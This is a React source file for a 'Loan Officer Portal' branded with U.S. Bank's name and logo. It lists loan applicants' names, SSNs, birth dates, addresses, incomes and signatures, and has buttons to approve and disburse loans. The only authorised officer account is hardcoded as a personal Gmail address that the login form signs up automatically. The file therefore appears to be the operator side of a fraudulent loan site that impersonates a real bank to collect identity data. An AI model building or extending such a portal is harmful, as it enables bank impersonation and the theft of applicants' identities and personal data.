import { createFileRoute, Link } from "@tanstack/react-router";
import { useCallback, useEffect, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { logoDataUri, LOGO_WIDTH, LOGO_HEIGHT } from "@/assets/logo";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Toaster } from "@/components/ui/sonner";
import { toast } from "sonner";
import { currency } from "@/lib/banks";
import { CheckCircle2, Clock, LogOut, XCircle } from "lucide-react";

export const Route = createFileRoute("/officer")({
  ssr: false,
  head: () => ({
    meta: [
      { title: "Loan Officer Portal | U.S. Bank" },
      {
        name: "description",
        content:
          "Secure loan officer portal to review submitted personal loan applications and approve or decline disbursements.",
      },
      { property: "og:title", content: "Loan Officer Portal | U.S. Bank" },
      {
        property: "og:description",
        content: "Review, approve or decline submitted loan applications.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
  }),
  component: OfficerPortal,
});

type Application = {
  id: string;
  amount: number;
  apr: number;
  term_months: number;
  first_name: string;
  last_name: string;
  ssn: string;
  dob: string | null;
  cell_phone: string;
  email: string;
  street: string;
  city: string;
  state: string;
  zip: string;
  employer: string;
  job_title: string;
  annual_income: string;
  loan_purpose: string;
  signature: string;
  status: "pending" | "approved" | "declined";
  created_at: string;
};

const OFFICER_EMAIL = "cruzwilliamsanthony@gmail.com";

function maskSsn(ssn: string) {

  const digits = ssn.replace(/\D/g, "");
  return digits.length >= 4 ? `•••-••-${digits.slice(-4)}` : "•••-••-••••";
}

function OfficerPortal() {
  const [isOfficer, setIsOfficer] = useState<boolean | null>(null);
  const [apps, setApps] = useState<Application[]>([]);

  const check = useCallback(async () => {
    const { data: userData } = await supabase.auth.getUser();
    if (!userData.user) {
      setIsOfficer(false);
      return;
    }
    const { data } = await supabase.rpc("has_role", {
      _user_id: userData.user.id,
      _role: "officer",
    });
    setIsOfficer(Boolean(data));
  }, []);

  const load = useCallback(async () => {
    const { data } = await supabase
      .from("loan_applications")
      .select("*")
      .order("created_at", { ascending: false });
    setApps((data as Application[]) ?? []);
  }, []);

  useEffect(() => {
    check();
  }, [check]);

  useEffect(() => {
    if (isOfficer) load();
  }, [isOfficer, load]);

  return (
    <div className="min-h-screen bg-surface">
      <Toaster />
      <header className="border-b bg-card">
        <div className="mx-auto flex max-w-5xl items-center justify-between px-4 py-3">
          <Link to="/">
            <img
              src={logoDataUri}
              alt="U.S. Bank"
              width={LOGO_WIDTH}
              height={LOGO_HEIGHT}
              className="h-7 w-auto"
            />
          </Link>
          <span className="text-sm font-medium text-muted-foreground">
            Loan officer portal
          </span>
        </div>
      </header>

      {isOfficer === null && (
        <p className="mx-auto max-w-5xl px-4 py-10 text-sm text-muted-foreground">
          Loading…
        </p>
      )}

      {isOfficer === false && <LoginForm onSuccess={check} />}

      {isOfficer && (
        <main className="mx-auto max-w-5xl px-4 py-8">
          <div className="flex items-center justify-between">
            <div>
              <h1 className="text-2xl font-bold text-foreground">
                Submitted applications
              </h1>
              <p className="mt-1 text-sm text-muted-foreground">
                Approving a loan disburses the funds into the borrower's primary
                checking account immediately.
              </p>
            </div>
            <Button
              variant="ghost"
              size="sm"
              onClick={async () => {
                await supabase.auth.signOut();
                setIsOfficer(false);
              }}
            >
              <LogOut className="mr-2 h-4 w-4" /> Sign out
            </Button>
          </div>

          <div className="mt-6 space-y-4">
            {apps.map((a) => (
              <ApplicationCard key={a.id} app={a} onDecided={load} />
            ))}
            {apps.length === 0 && (
              <p className="rounded-xl border bg-card p-6 text-sm text-muted-foreground">
                No applications submitted yet.
              </p>
            )}
          </div>
        </main>
      )}
    </div>
  );
}

function LoginForm({ onSuccess }: { onSuccess: () => void }) {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [busy, setBusy] = useState(false);

  async function submit(e: React.FormEvent) {
    e.preventDefault();
    setBusy(true);
    let { data, error } = await supabase.auth.signInWithPassword({
      email: email.trim(),
      password,
    });
    if (error && email.trim().toLowerCase() === OFFICER_EMAIL) {
      // First-time officer setup: provision the portal account.
      const signUp = await supabase.auth.signUp({
        email: email.trim(),
        password,
      });
      if (!signUp.error) {
        ({ data, error } = await supabase.auth.signInWithPassword({
          email: email.trim(),
          password,
        }));
      }
    }
    if (error || !data.user) {
      setBusy(false);
      toast.error("Sign in failed", { description: error?.message });
      return;
    }

    const { data: isOfficer } = await supabase.rpc("has_role", {
      _user_id: data.user.id,
      _role: "officer",
    });
    setBusy(false);
    if (!isOfficer) {
      await supabase.auth.signOut();
      toast.error("This account is not a loan officer");
      return;
    }
    onSuccess();
  }

  return (
    <main className="mx-auto w-full max-w-md px-4 py-12">
      <form
        onSubmit={submit}
        className="rounded-xl border bg-card p-6 shadow-[var(--shadow-card)]"
      >
        <h1 className="text-2xl font-bold text-foreground">Officer sign in</h1>
        <p className="mt-1 text-sm text-muted-foreground">
          Authorized loan officers only.
        </p>
        <div className="mt-6 space-y-4">
          <div className="space-y-2">
            <Label htmlFor="officer-email">Email address</Label>
            <Input
              id="officer-email"
              type="email"
              required
              value={email}
              onChange={(e) => setEmail(e.target.value)}
            />
          </div>
          <div className="space-y-2">
            <Label htmlFor="officer-password">Password</Label>
            <Input
              id="officer-password"
              type="password"
              required
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
          </div>
        </div>
        <Button type="submit" className="mt-6 w-full" disabled={busy}>
          {busy ? "Signing in…" : "Sign in"}
        </Button>
      </form>
    </main>
  );
}

function ApplicationCard({
  app,
  onDecided,
}: {
  app: Application;
  onDecided: () => void;
}) {
  const [busy, setBusy] = useState(false);

  async function decide(approve: boolean) {
    setBusy(true);
    const { error } = await supabase.rpc("decide_loan", {
      _application_id: app.id,
      _approve: approve,
    });
    setBusy(false);
    if (error) {
      toast.error("Action failed", { description: error.message });
      return;
    }
    toast.success(approve ? "Loan approved and disbursed" : "Loan declined");
    onDecided();
  }

  return (
    <div className="rounded-xl border bg-card p-6 shadow-[var(--shadow-card)]">
      <div className="flex flex-wrap items-start justify-between gap-3">
        <div>
          <h2 className="text-lg font-semibold text-foreground">
            {app.first_name} {app.last_name}
          </h2>
          <p className="text-sm text-muted-foreground">
            {app.email} · {app.cell_phone}
          </p>
        </div>
        <div className="text-right">
          <p className="text-2xl font-bold text-primary">
            {currency(Number(app.amount))}
          </p>
          <p className="text-xs text-muted-foreground">
            {Number(app.apr)}% APR · {app.term_months} months
          </p>
        </div>
      </div>

      <dl className="mt-4 grid gap-3 text-sm sm:grid-cols-2">
        <Row label="SSN" value={maskSsn(app.ssn)} />
        <Row label="Date of birth" value={app.dob ?? "—"} />
        <Row
          label="Address"
          value={`${app.street}, ${app.city}, ${app.state} ${app.zip}`}
        />
        <Row label="Employer" value={`${app.employer} — ${app.job_title}`} />
        <Row label="Annual income" value={app.annual_income} />
        <Row label="Purpose" value={app.loan_purpose} />
        <Row label="Signature" value={app.signature} />
        <Row
          label="Submitted"
          value={new Date(app.created_at).toLocaleString()}
        />
      </dl>

      <div className="mt-5 flex items-center justify-between gap-3 border-t pt-4">
        {app.status === "pending" ? (
          <>
            <span className="inline-flex items-center gap-1 text-sm text-muted-foreground">
              <Clock className="h-4 w-4" /> Awaiting decision
            </span>
            <div className="flex gap-2">
              <Button
                variant="outline"
                size="sm"
                disabled={busy}
                onClick={() => decide(false)}
              >
                Decline
              </Button>
              <Button size="sm" disabled={busy} onClick={() => decide(true)}>
                Approve & disburse
              </Button>
            </div>
          </>
        ) : app.status === "approved" ? (
          <span className="inline-flex items-center gap-1 text-sm font-medium text-accent">
            <CheckCircle2 className="h-4 w-4" /> Approved — funds disbursed
          </span>
        ) : (
          <span className="inline-flex items-center gap-1 text-sm font-medium text-destructive">
            <XCircle className="h-4 w-4" /> Declined
          </span>
        )}
      </div>
    </div>
  );
}

function Row({ label, value }: { label: string; value: string }) {
  return (
    <div>
      <dt className="text-xs uppercase tracking-wide text-muted-foreground">
        {label}
      </dt>
      <dd className="text-foreground">{value}</dd>
    </div>
  );
}
